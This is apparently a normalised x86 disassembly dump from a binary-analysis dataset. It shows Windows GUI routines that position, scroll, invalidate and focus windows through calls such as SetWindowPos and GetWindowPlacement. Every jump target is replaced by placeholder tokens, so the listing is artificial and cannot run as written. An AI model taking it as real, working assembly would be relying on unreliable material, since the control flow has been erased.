mov eax [ ebp - 0x14 ]
mov bx 0xffaf
call sub_44c24c
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
mov bx 0xfff0
call sub_44c24c
test al al
jne r-xdata
sub_433cdc
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_433c28
test al al
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
movzx ecx [ ecx + 0x4 ]
mov edx 0xb02e
mov eax [ ebp - 0x4 ]
call sub_42df28
test eax eax
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov [ ebp - 0xc ] 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebp - 0xc ] 0x4
sub eax 0x3
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
push 0x0
mov ecx [ ebp - 0x8 ]
movzx ecx [ ecx + 0x4 ]
mov edx 0xb01e
mov eax [ ebp - 0x4 ]
call sub_42df28
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax [ ebp - 0x4 ]
call sub_42df28
and eax [ ebp - 0xc ]
jne r-xdata
mov [ ebp - 0xc ] 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41a7a4
mov ecx [ ebp - 0x8 ]
movzx ecx [ ecx + 0x4 ]
mov edx 0xb005
call sub_42df28
test eax eax
jne r-xdata
jmp r-xdata
sub_433de4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
mov ecx [ ebp - 0x8 ]
movzx ecx [ ecx + 0x4 ]
mov edx 0xb01e
mov eax [ ebp - 0x4 ]
call sub_42df28
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_433e48
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax [ ebp - 0x4 ]
call sub_42df28
test al 0x80
jne r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41a7a4
mov ecx [ ebp - 0x8 ]
movzx ecx [ ecx + 0x4 ]
mov edx 0xb006
call sub_42df28
test eax eax
jne r-xdata
sub_433eac
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_433c28
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
movzx ecx [ ecx + 0x4 ]
mov edx 0xb02e
mov eax [ ebp - 0x4 ]
call sub_42df28
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41a7a4
mov ecx [ ebp - 0x8 ]
movzx ecx [ ecx + 0x4 ]
mov edx 0xb005
call sub_42df28
test eax eax
jne r-xdata
sub_433f28
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x20
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41a7a4
mov ecx [ ebp - 0x8 ]
movzx ecx [ ecx + 0x4 ]
mov edx 0xb006
call sub_42df28
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
sub_433f74
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x34 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x3c ] eax
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x38 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_42bdc0
mov eax [ ebp - 0x4 ]
mov bx 0xffd5
call sub_44c24c
mov [ ebp - 0x38 ] 0x2c
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x48 ]
mov eax [ ebp - 0x4 ]
call sub_42c198
lea esi [ ebp - 0x48 ]
lea edi [ ebp - 0x1c ]
mov ecx 0x4
[ edi ] [ esi ]
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43408c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_430844
dec eax
test eax eax
jl r-xdata
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov bx 0xffed
call sub_44c24c
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
sub_4340dc
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_430280
xor eax eax
push ebp
push sub_434133
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43408c
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42c4e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43413a
mov eax [ ebp - 0x4 ]
call sub_430294
retn
sub_434140
push ebp
mov ebp esp
add esp 0xffffffe4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14c ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ ebp - 0xd ] al
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_430844
dec eax
test eax eax
jl r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call ScrollWindow
mov eax [ ebp - 0x4 ]
call sub_4302c8
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ edx + 0x30 ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x18 ]
add [ edx + 0x34 ] eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x14c ] 0x0
jne r-xdata
inc [ ebp - 0x14 ]
dec [ ebp - 0x1c ]
jne r-xdata
cmp [ ebp - 0xd ] 0x0
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
push 0x14
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x3c ]
push eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x34 ]
add eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x30 ]
add eax [ ebp - 0x8 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14c ]
push eax
call SetWindowPos
sub_434248
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0xac ]
sub_434274
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
cmp [ eax + 0x134 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x180 ]
mov edx [ ebp - 0x4 ]
call sub_43c504
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x134 ]
mov eax [ eax + 0x8 ]
sub [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x180 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x10 ]
jl r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x180 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x10 ]
dec eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call SetWindowPos
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x180 ]
mov edx [ ebp - 0xc ]
call sub_43c2dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x180 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_43c550
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
mov edx [ ebp - 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x180 ]
call sub_43c464
call sub_434714
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x180 ]
mov edx [ ebp - 0x8 ]
call sub_43c464
call sub_434714
mov [ ebp - 0x14 ] eax
sub_4343d4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14c ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
xor eax eax
mov al [ ebp - 0x5 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call SetWindowPos
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x180 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx [ ebp - 0x10 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_434274
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x134 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
cmp [ eax + 0x134 ] 0x0
je r-xdata
sub_434478
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call GetDC
mov [ ebp - 0xc ] eax
push 0x12
push 0x0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14c ]
mov [ eax ] edx
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ad8
call sub_44c7a8
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub_434504
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_42df28
mov eax [ ebp - 0x4 ]
test [ eax + 0x40 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call InvalidateRect
sub_43456c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call UpdateWindow
sub_434594
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x80 ]
pop ecx
pop ebp
retn
sub_4345b4
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_42c198
push 0x1
push 0x1
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x14c ]
push eax
call InvalidateRect
mov esp ebp
pop ebp
retn
sub_4345f4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_41a7a4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jne r-xdata
sub_434654
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a7a4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41f664
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a7e8
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SetFocus
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_4346a4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14c ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x14c ]
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_4346dc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14c ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_4346dc
sub_434714
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4346dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_434738
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov eax [ ebp - 0x8 ]
push eax
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_43b7c8
mov eax [ ebp - 0x4 ]
call sub_430844
dec eax
test eax eax
jl r-xdata
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x14 ]
cmp eax [ edx + 0x30 ]
jle r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
cmp eax [ edx + 0x34 ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov edx [ edx + 0x30 ]
mov [ eax ] edx
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x41 ] 0x4
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x14 ]
add eax [ edx + 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x8 ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov edx [ edx + 0x34 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x47 ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
add eax [ edx + 0x3c ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0xc ]
jle r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x14 ]
add eax [ edx + 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
add eax [ edx + 0x3c ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
sub_434834
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call ClientToScreen
pop ecx
pop ecx
pop ebp
retn
sub_434868
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call GetClientRect
pop ecx
pop ecx
pop ebp
retn
sub_43488c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x1
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
push 0x16
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SetWindowPos
mov eax [ ebp - 0x4 ]
mov bx 0xffd5
call sub_44c24c
sub_4348e0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x12c ]
cmp eax [ ebp - 0x8 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x12c ] eax
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax [ ebp - 0x4 ]
call sub_42df28
sub_43491c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x138 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x138 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x160 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
mov eax [ ebp - 0x4 ]
call sub_42df28
sub_434964
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x160 ]
xor al 0x1
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_434984
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x160 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x160 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_42df28
sub_4349c8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov [ ebp - 0x6 ] 0xffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x16c ]
mov edx [ ebp - 0x4 ]
call sub_43c504
mov [ ebp - 0x6 ] ax
jmp r-xdata
mov ax [ ebp - 0x6 ]
pop ecx
pop ecx
pop ebp
retn
sub_434a04
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4349c8
movsx eax ax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x6 ] 0x0
jge r-xdata
movsx eax [ ebp - 0x6 ]
cmp eax [ ebp - 0x10 ]
jl r-xdata
mov [ ebp - 0x6 ] 0x0
movsx eax [ ebp - 0x6 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov ax [ ebp - 0x10 ]
dec eax
mov [ ebp - 0x6 ] ax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x16c ]
mov edx [ ebp - 0xc ]
call sub_43c2dc
movsx edx [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x16c ]
mov ecx [ ebp - 0x4 ]
call sub_43c550
sub_434a90
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x44 ] 0x8
je r-xdata
mov dx [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_434a04
movsx eax [ ebp - 0x6 ]
